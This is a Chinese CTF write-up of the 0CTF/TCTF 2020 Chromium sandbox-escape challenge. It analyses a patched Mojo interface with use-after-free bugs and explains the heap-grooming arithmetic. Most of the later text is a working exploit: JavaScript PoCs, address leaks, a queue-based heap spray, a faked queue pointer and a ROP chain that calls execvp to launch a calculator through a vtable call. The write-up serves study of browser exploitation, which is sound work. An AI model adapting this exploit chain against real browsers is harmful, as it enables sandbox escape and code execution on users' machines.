`0ctf`上`chrome`系列题目的第二题，承接[上一篇](https://f0cus77.github.io/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B9%8B0ctf2020-chromium_rce-writeup/)分析文章，利用`Mojo`进行沙箱逃逸。

描述
--

题目附件：

```bash
$ ls
Dockerfile        NOTE              chrome.zip        chromium_sbx.diff flag.txt          flag_printer      mojo_js.zip       run.sh            server.py         visit.sh
```

`visit.sh`中`--enable-blink-features=MojoJS`表示在`JS`中可以使用`MojoJS`的功能。

```bash
timeout 30 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS "$1"
```

其它的没有啥可以看的，不用想肯定是在`chromium_sbx`中自定义了`Mojo`接口，所以直接去看`diff`文件就可以了。

分析
--

### diff 分析

先去看`mojom`文件，可以看到它实现了两个接口，分别是`TStorage`以及`TInstance`。

```diff
+module blink.mojom;
+
+interface TStorage {
+    Init() =&gt; ();
+    CreateInstance() =&gt; (pending_remote instance);
+    GetLibcAddress() =&gt; (uint64 addr);
+    GetTextAddress() =&gt; (uint64 addr);
+};
+
+interface TInstance {
+    Push(uint64 value) =&gt; ();
+    Pop() =&gt; (uint64 value);
+    Set(uint64 index, uint64 value) =&gt; ();
+    Get(uint64 index) =&gt; (uint64 value);
+    SetInt(int64 value) =&gt; ();
+    GetInt() =&gt; (int64 value);
+    SetDouble(double value) =&gt; ();
+    GetDouble() =&gt; (double value);
+    GetTotalSize() =&gt; (int64 size);
+};
```

先看`TStorageImpl`的声明与实现，声明如下：

```diff
+namespace content {
+
+    class CONTENT_EXPORT TStorageImpl
+        : public blink::mojom::TStorage {
+    public:
+        TStorageImpl();
+        ~TStorageImpl() override;
+        static void Create(mojo::PendingReceiver receiver);
+
+        base::WeakPtr AsWeakPtr();
+
+        // TStorage mojom interface
+        void Init(InitCallback callback) override;
+        void CreateInstance(CreateInstanceCallback callback) override;
+        void GetLibcAddress(GetLibcAddressCallback callback) override;
+        void GetTextAddress(GetTextAddressCallback callback) override;
+
+        std::unique_ptr inner_db_;
+        base::WeakPtrFactory weak_factory_;
+    };
+
+} // namespace content
```

可以看到它有四个成员函数，待会在实现中再好好分析。先看它的成员变量，分别是`inner_db_`以及`weak_factory_`。其中`inner_db_`是`InnerDbImpl`类。

因为`InnerDbImpl`类是上面两个接口类实现的基础，所以先去看它的声明与实现，声明如下所示。

```diff
+namespace content {
+    class InnerDbImpl : InnerDb {
+    public:
+        InnerDbImpl();
+        ~InnerDbImpl() override;
+
+        void Push(uint64_t value);
+        uint64_t Pop();
+        void Set(uint64_t index, uint64_t value);
+        uint64_t Get(uint64_t index);
+        void SetInt(int64_t value);
+        int GetInt();
+        void SetDouble(double value);
+        double GetDouble();
+        uint64_t GetTotalSize() override;
+
+        std::array array_;
+        base::queue queue_;
+        int64_t int_value_ = 0;
+        double double_value_ = 0.0;
+    };
+}
```

可以看到它有四个成员变量：

- 大小为`200`的`int64_t`数组`array_`；
- 存储`int64_t`的队列`queue_`；
- 存储`int64_t`的`int`值`int_value_`；
- 存储浮点数的`double_value_`。

其中`Push`与`Pop`是用来从队列`queue_`中压入与弹出数据；`Get`与`Set`则是在对应的数组`array_`中获取及存入对应`index`的数据；`GetInt`及`SetInt`是设置变量`int_value_`的值；`SetDouble`与`GetDouble`是设置相应浮点数的值；`GetTotoalSize`则是返回数组`array_`及队列`queue_`大小的总和。

再来看`TStorageImpl`类的实现，如下所示：

```diff
+namespace content {
+
+TStorageImpl::TStorageImpl() : weak_factory_(this) {}
+
+// static
+void TStorageImpl::Create(mojo::PendingReceiver receiver) {
+    mojo::MakeSelfOwnedReceiver(std::make_unique(),
+                                std::move(receiver));
+}
+
+TStorageImpl::~TStorageImpl() {}
+
+base::WeakPtr
+TStorageImpl::AsWeakPtr() {
+    return weak_factory_.GetWeakPtr();
+}
+
+void TStorageImpl::Init(InitCallback callback) {
+    inner_db_ = std::make_unique();
+
+    std::move(callback).Run();
+}
+
+void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
+    mojo::PendingRemote instance;
+    mojo::MakeSelfOwnedReceiver(std::make_unique(inner_db_.get()),
+                                instance.InitWithNewPipeAndPassReceiver());
+
+    std::move(callback).Run(std::move(instance));
+}
+
+// NOTE: On Windows platform, binary and library address of chrome main process is same
+// as renderer process, so we suppose you already have these addresses in SBX challenge.
+// In fact, even without these two functions, you can also solve this problem, but I don't
+// think it's friendly to players in a 48-hour game. Maybe you can try it after the match :)
+void TStorageImpl::GetLibcAddress(GetLibcAddressCallback callback) {
+    std::move(callback).Run((uint64_t)(&amp;atoi));
+}
+void TStorageImpl::GetTextAddress(GetTextAddressCallback callback) {
+    std::move(callback).Run((uint64_t)(&amp;TStorageImpl::Create));
+}
+
+} 
```

`Init`函数调用`std::make_unique()`初始化创建了`inner_db_`；`CreateInstance`调用`std::make_unique`创建`TInstance`实例，参数是调用`inner_db_.get()`所获取的指针。然后调用`MakeSelfOwnedReceiver`与`mojo`实例绑定，也就是说即使`TStorageImpl`实例被释放了，只要`mojo`句柄没关闭，`TInstanceImpl`实例就不会被释放。

`GetLibcAddress`顾名思义，会返回`atoi`函数的地址；`GetTextAddress`则是返回`TStorageImpl::Create`函数的地址，这两个函数是为了简化题目的难度，直接给了地址泄露，没有其它的功能。

`TStorageImpl`分析完了，我们再来看`TInstanceImpl`的声明与实现，声明如下所示。

```diff
+namespace content {
+
+    class CONTENT_EXPORT TInstanceImpl
+        : public blink::mojom::TInstance {
+    public:
+        TInstanceImpl(InnerDbImpl* db);
+        ~TInstanceImpl() override;
+
+        base::WeakPtr AsWeakPtr();
+
+        // TInstance mojom interface
+        void Push(uint64_t value, PushCallback callback) override;
+        void Pop(PopCallback callback) override;
+        void Set(uint64_t index, uint64_t value, SetCallback callback) override;
+        void Get(uint64_t index, GetCallback callback) override;
+        void SetInt(int64_t value, SetIntCallback callback) override;
+        void GetInt(GetIntCallback callback) override;
+        void SetDouble(double value, SetDoubleCallback callback) override;
+        void GetDouble(GetDoubleCallback callback) override;
+        void GetTotalSize(GetTotalSizeCallback callback) override;
+
+        InnerDbImpl* inner_db_ptr_;
+        base::WeakPtrFactory weak_factory_;
+    };
+
+} // namespace content
```

可以看到也有个成员变量是`inner_db_ptr_`。其余的成员函数则是调用`InnerDbImpl`类中对应的函数。

### 漏洞分析

根据出题人的[wp](https://dmxcsnsbh.github.io/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/)，这题有两个漏洞，一个是预期的漏洞，一个是非预期漏洞，这里两个漏洞都讲一讲。

漏洞的主要成因是在构建`TInstance`实例的时候，参数对象使用的是`inner_db_.get()`来进行获取，

```diff
+void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
+    mojo::PendingRemote instance;
+    mojo::MakeSelfOwnedReceiver(std::make_unique(inner_db_.get()),
+                                instance.InitWithNewPipeAndPassReceiver());
+
+    std::move(callback).Run(std::move(instance));
+}
```

`unique_ptr`如果调用`get`函数获取指针的话，则`get`的返回值就不再是智能指针，`unique_ptr`被释放后，`get`返回的值就很容易形成`uaf`。如`p = bar.get()`，`bar`是一个智能指针，`p`是一个普通指针。`p = bar.get()`，`bar`并非被释放，也就相当于指针`p`和智能指针`bar`共同管理一个对象，所以就`*p`做的一切，都会反应到`bar`指向的对象上。而且如果`bar`被释放而`p`没被释放的话，就会出现`UAF`漏洞。

漏洞一是在创建`TInstance`实例的时候，调用`inner_db_.get()`作为参数，同时调用`mojo::MakeSelfOwnedReceiver`将`TInstanceImpl`生命周期与`mojo`所绑定，此时如果我们释放`TStorageImpl`对象，它的成员变量`inner_db_`会被释放。然后因为`Mojo`没有关闭，此时`TInstance`仍然有效，`inner_db_.get()`获取的指针仍然可以使用，然而`inner_db_`已经被释放了，我们可以通过`TInstance`来操作已经被释放的内存，形成`uaf`漏洞。

最终形成的`poc`如下：

```js
async function poc()
{

    let tStoragePtr = new blink.mojom.TStoragePtr();
    Mojo.bindInterface(
        blink.mojom.TStorage.name,
        mojo.makeRequest(tStoragePtr).handle,
    );

    // malloc innerdb
    tStoragePtr.init();
    // get TInstance ptr
    let tInstancePtr = (await tStoragePtr.createInstance()).instance;

    // free the innerdb ptr by free tStoragePtr
    tStoragePtr.ptr.reset();

    // still call freed innerdb by tInstangcePTr.
    await tInstancePtr.getTotalSize();
}

```

这个方法不是出题人的意思，出题人的本意是漏洞二。即通过两次调用`Init`函数来形成`UAF`漏洞，及在调用`TStorageImpl::Init`初始化`inner_db_`以后；再调用`TStorageImpl::CreateInstance`来创建`TInstance`；然后再调用`TStorageImpl::Init`函数再次申请`inner_db_`，此时智能指针会自动释放之前的对象内存；然而该内存在创建`TInstance`已经被作为参数传入了，因此后续使用`TInstance`仍然可以使用被释放的内存，形成`uaf`漏洞。

`poc`代码如下：

```js
async function poc()
{

    let tStoragePtr = new blink.mojom.TStoragePtr();
    Mojo.bindInterface(
        blink.mojom.TStorage.name,
        mojo.makeRequest(tStoragePtr).handle,
    );

    // malloc innerdb
    tStoragePtr.init();
    // get TInstance ptr
    let tInstancePtr = (await tStoragePtr.createInstance()).instance;

    // free the innerdb ptr by free malloc innerdb again
    tStoragePtr.init();

    // still call freed innerdb by tInstangcePTr.
    await tInstancePtr.getTotalSize();
}
```

利用
--

上面漏洞已经分析清楚了，现在再来说说利用的事。

首先要解决的是`uaf`所释放的内存`InnerDbImpl`有多大，以及我们如何可以使用可控的内存来控制它。

我们可以将断点下在`TStorageImpl::Init`，得到如下的代码。可以看到`InnerDbImpl`的大小是`0x678`。

```asm
   0x555558f0a0b8    push   rbx
   0x555558f0a0b9    push   rax
   0x555558f0a0ba    mov    r14, rsi
   0x555558f0a0bd    mov    r15, rdi
   0x555558f0a0c0    mov    edi, 0x678
 ► 0x555558f0a0c5    call   0x55555ae3d9f0 &lt;0x55555ae3d9f0&gt;

   0x555558f0a0ca    mov    rbx, rax
   0x555558f0a0cd    mov    rdi, rax
   0x555558f0a0d0    call   content::InnerDbImpl::InnerDbImpl() 
```

另一个就是释放`0x678`大小的内存以后，我们怎样再将它申请出来。之前做的题都可以申请任意大小的内存，然而在这里所有的内存大小都是固定的，只有整数队列`queue_`可能可以发生变化。参考的文章是[0CTF/TCTF 2020 Quals Chromium SBX](https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html)里的方法，确实很巧妙。总的来来说是通过扩大可控的`queue_`来实现任意内存的分配。

具体来说`push_front`以及`pop_front`的扩大内存分配以及缩小内存分配的函数是`ExpandCapacityIfNecessary`以及`ShrinkCapacityIfNecessary`

```c++
// --- push ---
void push_front(const T&amp; value) { emplace_front(value); }
template 
reference emplace_front(Args&amp;&amp;... args) {
  ExpandCapacityIfNecessary(1); 
  // the function used to expand buffer,
  // which we care about because this affect the size of buffer allocated

  // ... do the actual push, which we don't care
}

// --- pop ---
void pop_front() {
  // ... actual poping operation, which we don't care

  ShrinkCapacityIfNecessary(); 
  // the function used to shrink the capacity, which is buffer size,
  // so we care about this function

  // ...
}
```

再深跟一步可以知道，`push`的过程中，当内存不足时，它会将内存扩展至`std::max(min_new_capacity, capacity() + capacity() / 4)`，即当前内存为`x`，会将内存扩展为`man(x+1, 5/4*x)`；当空余的内存大于一半时（`empty_spaces &lt; sz`），此时内存需要缩小，它会将内存缩小至（`sz + sz / 4`，`sz`为当年内存），因为内存在小于一半才缩小，因为`sz=1/2*x`，所以缩小时，内存会缩小至`5/8*x`

```c++
// Expands the buffer size. This assumes the size is larger than the
// number of elements in the vector (it won't call delete on anything).
void SetCapacityTo(size_t new_capacity) {
  // Use the capacity + 1 as the internal buffer size to differentiate
  // empty and full (see definition of buffer_ below).
  VectorBuffer new_buffer(new_capacity + 1);
  // using VectorBuffer = internal::VectorBuffer;
  // if we look at implementation of VectorBuffer, this will allocate
  // `(new_capacity + 1) * sizeof(T)` bytes of memory.
  // since our queue element type is uint64_t, sizeof(T) is 8.
  // thus to allocate 0x678 bytes, 
  // we need to let new_capacity=(0x678/8)-1=206
  MoveBuffer(buffer_, begin_, end_, &amp;new_buffer, &amp;begin_, &amp;end_);
  buffer_ = std::move(new_buffer);
}
void ExpandCapacityIfNecessary(size_t additional_elts) {
  size_t min_new_capacity = size() + additional_elts;
  if (capacity() &gt;= min_new_capacity)
    return;  // Already enough room.

  min_new_capacity =
      std::max(min_new_capacity, internal::kCircularBufferInitialCapacity);
  // in our case, min_new_capacity &gt; internal::kCircularBufferInitialCapacity
  // when this line is reached,
  // because kCircularBufferInitialCapacity is the initial capacity, 3

  // std::vector always grows by at least 50%. WTF::Deque grows by at least
  // 25%. We expect queue workloads to generally stay at a similar size and
  // grow less than a vector might, so use 25%.
  size_t new_capacity =
      std::max(min_new_capacity, capacity() + capacity() / 4);
  // grow 25% each time, but we need to at least grow to min_new_capacity
  SetCapacityTo(new_capacity);
}

void ShrinkCapacityIfNecessary() {
  // Don't auto-shrink below this size.
  if (capacity() &lt;= internal::kCircularBufferInitialCapacity)
    return;

  // Shrink when 100% of the size() is wasted.
  // namely only shrink when size &lt;= empty_space
  size_t sz = size();
  size_t empty_spaces = capacity() - sz;
  if (empty_spaces &lt; sz)
    return;

  // Leave 1/4 the size as free capacity, not going below the initial
  // capacity.
  size_t new_capacity =
      std::max(internal::kCircularBufferInitialCapacity, sz + sz / 4);
  // since `sz` is around `capacity/2`, 
  // so capacity is shrinked to around `5/8` of the original capacity  
  if (new_capacity &lt; capacity()) {
    // Count extra item to convert to internal capacity.
    SetCapacityTo(new_capacity);
  }
}
```

因此我们如果想要申请`0x678`大小的内存，就可以通过`push`和`pop`的顺序来达成目的。这个顺序可以通过爆破的方式来最终实现，代码如下所示：

```python
from random import *

def run():
    x = 10
    # we start at 10, because 10 is the capacity value
    # that +1/4 operation starts to play the expanding role
    ways = []
    while x &lt; 207:
            b = random() &gt; 0.1 # we want more expand
            ways.append(b)
            if b: # mimic expand operation
                    x = int(max(x + 1, x + x / 4))
            else: # mimic shrink operation
                    x = x / 2
                    x += x / 4
            print (x)
            if x == 206:
                    print "!!!" # notify when 206 is reached
                    return True
    print ways
    return False

while (not run()):
    pass
```

我多运行了几次，挑选了一个看起来还比较少的序列来进行实现。

```bash
12
15
18
22
27
33
41
51
63
78
48
60
75
93
57
71
88
55
68
85
106
132
165
206
!!!
```

还需要知道一点的是`queue`的内存结构，如下所示。`queue`对象占用大小为`4`个内存，在未存储数据时四个字段均为`0`。初始化后第一个字段指向分配的内存大小；第二个字段存储为`queue`内存空间大小，最后一个字段则是目前已使用的空间大小。

```php
before init:

           container        capacity
    - | 0x000000000000 | 0x000000000000 |
    - | 0x000000000000 | 0x000000000000 |
            front             rear
                       |
                       |
    after first push   |
                       |
 +------------+        |
 |            |        v
 |         container        capacity
 |  - | 0x1f15101a3440 | 0x000000000004 |
 |  - | 0x000000000000 | 0x000000000001 |
 |          front             rear
 |
 +--&gt; 0x1f15101a3440(heap):
    - | arr[0] | hole | hole | hole |
```

因为我们可控`inner_db_`对象，该对象中有`queue`对象，如果我们`uaf`控制该对象，通过伪造`inner_db_`中的`queue`对象中的数据结构，我们也可以实现任意地址读写。

具体的利用过程如下：

1. 利用先获取`glibc`以及程序基址
    
    ```js
       let tStoragePtr = new blink.mojom.TStoragePtr(); 
       Mojo.bindInterface(
           blink.mojom.TStorage.name,
           mojo.makeRequest(tStoragePtr).handle, 
       );
    
       // malloc innerdb
       tStoragePtr.init();
       // get TInstance ptr
       let tInstancePtr = (await tStoragePtr.createInstance()).instance;
    
       // leak addr
       let atoiAddr = (await tStoragePtr.getLibcAddress()).addr;
       let textAddr = (await tStoragePtr.getTextAddress()).addr;  
       let libcBaseAddr = BigInt(atoiAddr) - 0x47730n;
       let textBaseAddr = BigInt(textAddr) - 0x39b5e60n;
    
       console.log("[+]libc base addr: "+hex(libcBaseAddr));
       console.log("[+]text base addr: "+hex(textBaseAddr));
    ```
2. 触发漏洞，并利用`queue`队列占用该内存，占用该内存后，利用`innerdb-&gt;getInt`方法找到对应的被释放的对象：
    
    ```js
       // free the innerdb ptr by free tStoragePtr
       tStoragePtr.ptr.reset();
    
       // trying to occupy the innerdb memory by queue memeory
       for(let i=0; i&lt;0x5; i++) {
           for(let j=0; j&lt;78-10; j++) {
               // should push 0, which represent the innerdb's queue is null
               await sprayTIPtrArr[i].push(0x0n)
           };
           // can use getInt function to debug( check the memory layout )
           // await sprayTIPtrArr[0].getInt();
    
           for(let j=0; j&lt;78/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;93-78/2; j++) {
               await sprayTIPtrArr[i].push(0x0n);
           }
           // await sprayTIPtrArr[0].getInt();
    
           for(let j=0; j&lt;93/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;88-93/2; j++) {
               await sprayTIPtrArr[i].push(0x0n);
           }
           for(let j=0; j&lt;88/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;206-88/2-1; j++) {
               await sprayTIPtrArr[i].push(0x0n);
           }
           // await sprayTIPtrArr[0].getInt();
    
           await sprayTIPtrArr[i].push(BigInt(i));
       }
    
       // get the idx to see which one occupy the innerdb memory
       let evilTIIdx = (await tInstancePtr.getInt()).value;
       let evilTIPtr = sprayTIPtrArr[evilTIIdx];
       console.log("[+] the evil idx: "+hex(evilTIIdx));
    ```
3. 因为占用的内存`queue`字段被初始化为`0`，此时我们再进行`push`重新分配内存，此时可泄露堆地址：
    
    ```js
    // malloc queue ptr in freed innerdb memory;
       for(let i=0; i&lt;0x80/8; i++) {
           await tInstancePtr.push(0x41414141n+BigInt(i));
       }
    
       // await tInstancePtr.getInt();
    
       // leak the upper queue ptr, now the innerdb will be freed again
       let leakHeapAddr = -1n;
       for (let i=0; i&lt;207; i++) {
           let tmp = (await evilTIPtr.pop()).value;
           if (leakHeapAddr == -1 &amp;&amp; tmp != 0)  {
               leakHeapAddr = BigInt(tmp);
           }
       }
       console.log("[+] leak heap addr: "+hex(leakHeapAddr));
    ```
4. 有了堆地址就有了`rop`链存储的目标地址，构造`rop`链，并伪造`queue`指针将`rop`链写入到目标内存：
    
    ```js
    
       // trying to occupy again.
       for(let i=5; i&lt;10; i++) {
           for(let j=0; j&lt;78-10; j++) {
               await sprayTIPtrArr[i].push(0n)
           };
           // await sprayTIPtrArr[0].getInt();
    
           for(let j=0; j&lt;78/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;93-78/2; j++) {
               await sprayTIPtrArr[i].push(leakHeapAddr);
           }
           // await sprayTIPtrArr[0].getInt();
    
           for(let j=0; j&lt;93/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;88-93/2; j++) {
               await sprayTIPtrArr[i].push(0n);
           }
           for(let j=0; j&lt;88/2; j++) {
               await sprayTIPtrArr[i].pop();
           }
           for(let j=0; j&lt;202-88/2-1; j++) {
               await sprayTIPtrArr[i].push(0n);
           }
           // await sprayTIPtrArr[0].getInt();
    
           // put the queue pointer back which will be put with rop chain
           await sprayTIPtrArr[i].push(leakHeapAddr);
           await sprayTIPtrArr[i].push(BigInt(0x13));
           await sprayTIPtrArr[i].push(BigInt(0));
           await sprayTIPtrArr[i].push(BigInt(0));
           await sprayTIPtrArr[i].push(BigInt(i));
       }
    
       // get the idx
       evilTIIdx = (await tInstancePtr.getInt()).value;
       evilTIPtr = sprayTIPtrArr[evilTIIdx];
       console.log("[+] the evil idx: "+hex(evilTIIdx));
    
       // prepare the rop chain
       let execvp = textBaseAddr + 0x0000000a1b88d0n // :
       let xchgRaxRsp = textBaseAddr + 0x0000000007fde8e4n; //: xchg rax, rsp ; ret
       let popRdi = textBaseAddr + 0x0000000002e9ee1dn; //: pop rdi ; ret
       let popRdiRsi = textBaseAddr + 0x0000000003c320fdn // : pop rdi ; pop rsi ; ret
       let popRsi = textBaseAddr + 0x0000000002f49c6en; //: pop rsi ; ret
       let popRdx = textBaseAddr + 0x0000000002ea5d72n; // : pop rdx ; ret
    
       let binshAddr = leakHeapAddr + 0x50n;
    
       let ropBufferSize = 0x80;
       let ropBuffer = new ArrayBuffer(ropBufferSize);
       let ropData64 = new BigUint64Array(ropBuffer);
       let ropDataView = new DataView(ropBuffer);
    
       // size vatable offset in vtable is 0x10;
       ropDataView.setBigInt64(0x10,xchgRaxRsp,true);
    
       ropDataView.setBigInt64(0x0, popRdiRsi, true);
       ropDataView.setBigInt64(0x8, binshAddr, true);
    
       ropDataView.setBigInt64(0x18, popRsi, true);
       ropDataView.setBigInt64(0x20, 0n, true);
       ropDataView.setBigInt64(0x28, popRdx, true);
       ropDataView.setBigInt64(0x30, 0n, true);
       ropDataView.setBigInt64(0x38, popRdx, true);
       ropDataView.setBigInt64(0x40, 0n, true);
       ropDataView.setBigInt64(0x48, execvp, true);
       // ropDataView.setBigInt64(0x50, 0x68732f6e69622fn,true);  // /bin/sh
       ropDataView.setBigInt64(0x50, 0x6f6e672f6e69622fn,true);  // /bin/gno
       ropDataView.setBigInt64(0x58, 0x75636c61632d656dn,true);  // me-calcu
       ropDataView.setBigInt64(0x60, 0x726f74616cn,true);  // lator\x00
    
       // deploy the rop chain
       for(let i=0; i&lt;0x80/8; i++) {
           await tInstancePtr.push(ropData64[i]);
       }
    }
    ```
5. 触发虚表函数，执行`rop`链，成功弹出计算器：
    
    ```js
       // trigger rop by call vtable function.
       await tInstancePtr.getTotalSize();
    ```

需要说的一点是，因为可以通过伪造`queue`对象实现任意地址读写，所以这里也可以不用泄露堆地址，而是直接将`rop`链写到`bss`段，这样也是可行的。

总结
--

通过这题进一步巩固了`mojo uaf`的做法，通过`push`和`pop`来申请特定内存的方法也确实是巧妙，学到了。

参考
--

- [0CTF/TCTF 2020 Quals Chromium SBX](https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html)
- [0CTF/TCTF 2020 Chromium series challenge](https://dmxcsnsbh.github.io/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/)